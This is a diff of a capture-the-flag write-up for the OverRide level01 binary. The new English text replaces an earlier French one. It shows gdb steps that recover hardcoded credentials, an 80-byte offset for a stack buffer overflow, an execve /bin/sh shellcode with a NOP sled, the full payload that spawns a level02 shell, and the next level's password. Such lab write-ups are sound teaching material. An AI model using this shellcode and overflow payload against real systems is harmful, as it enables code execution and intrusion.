@@ -1,19 +1,83 @@
-En lancant le binaire, on nous demande un nom d'adminitrateur, puis une verification.
-Nous passons le binaire sous gdb puis verifions la fonction verify_user_name. Nous voyons qu'il compare le nom avec dat_wil, et il y a aussi une fonction verify_user_pass, ou le mot de passe comparer est admin.
-Nous rentrons ces infos, mais on nous dit mot de passe incorrect. En regardant de plus pres le binaire, Nous voyons qu'il y a un sub de 0x60 et un lea de 0x10 ce qui nous laisse supposer que la variable ou est stocker le password s'écrit comme ceci: char pass[80].
-Ensuite, nous voyons dans le fget, que le second parametre est egale a 100. Donc nous pouvons overflow ce pointer. En faisant plusieurs tests, nous trouvons son offset qui est égale a 80.
+Running the binary, an admin login prompt asks the user for a username.
 
-Apres, nous exportons un shellcode:
+level01@OverRide:~$ ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: toto
+verifying username....
+
+nope, incorrect username...
+
+Using gdb, we check the function verify_user_name().
+(gdb) b * 0x08048489
+(gdb) r
+(gdb) c
+Breakpoint 2, 0x08048489 in verify_user_name ()
+(gdb) x/s $edx
+0x804a040 <a_user_name>:         "toto\n"
+(gdb) x/s $eax
+0x80486a8:       "dat_wil"
+
+The function compares user input with "dat_wil".
+
+Using dat_wil as a username, the binary then asks us for a password and checks it via verify_user_pass().
+
+(gdb) b * 0x080484b9
+(gdb) r
+Starting program: /home/users/level01/level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_will
+verifying username....
+
+Enter Password: 
+o
+Breakpoint 1, 0x080484b9 in verify_user_pass ()
+(gdb) x/s $eax
+0x80486b0:       "admin"
+(gdb) x/s $edx
+0xffffd6ac:      "o\n"
+
+verify_user_pass() checks for "admin" as a password.
+Trying it as an input doesn't work.
+
+(gdb) disas main
+0x080484d8 <+8>:     sub    $0x60,%esp
+0x080484db <+11>:    lea    0x1c(%esp),%ebx
+
+We notice a buffer of 16 bytes for the password variable and the fgets uses 100 as it'size.
+0x080484e4 <+20>:    mov    $0x10,%edx -> 16
+0x08048565 <+149>:   movl   $0x64,0x4(%esp) -> 100
+
+We can use this to overlow.
+
+Find the offset : 
+
+python -c "print 'dat_wil' + '\n' + 'aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'" > /tmp/offset
+gdb) r < /tmp/offset
+Enter Username: verifying username....
+Enter Password: 
+nope, incorrect password...
+Program received signal SIGSEGV, Segmentation fault.
+0x75757575 in ?? ()
+
+0x75757575 is "uuuu" which is at offset 80.
+
+Let's export our shellcode :
 export SHELLCODE=`python -c 'print "\x90" * 250 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'`
+Find shellcode's address :
 
-Ensuite nous lancons le binaire sous gdb, mettons un break * main + 1 et le lancons.
+(gdb) b * main + 1
+(gdb) r
+Starting program: /home/users/level01/level01 
+Breakpoint 1, 0x080484d1 in main ()
+(gdb) x/200wx $esp
+0xffffd828:     0x90909090      0x90909090      0x90909090      0x90909090
 
-Puis nous lancons la commande x/200x $esp et localisons ainsi les \x90. Pour etre sur de tomber dedans nous prenons 0xffffd828 comme adresse.
+0xffffd828 is our shellcode's address.
+The payload is then :
 
-Puis nous avons simplement besoin de overflow et de mettre l'adresse du shellcode pour avoir acces au shell.
-
-python -c 'print "dat_wil\n" + "A" * 80 + "\x28\xd8\xff\xff"' > /tmp/jackpot
-
-cat /tmp/jackpot - | ./level01
+python -c 'print "dat_wil\n" + "A" * 80 + "\x28\xd8\xff\xff"' > /tmp/payload
+cat /tmp/payload - | ./level01
+whoami
+level02
 cd ../level02 && cat .pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
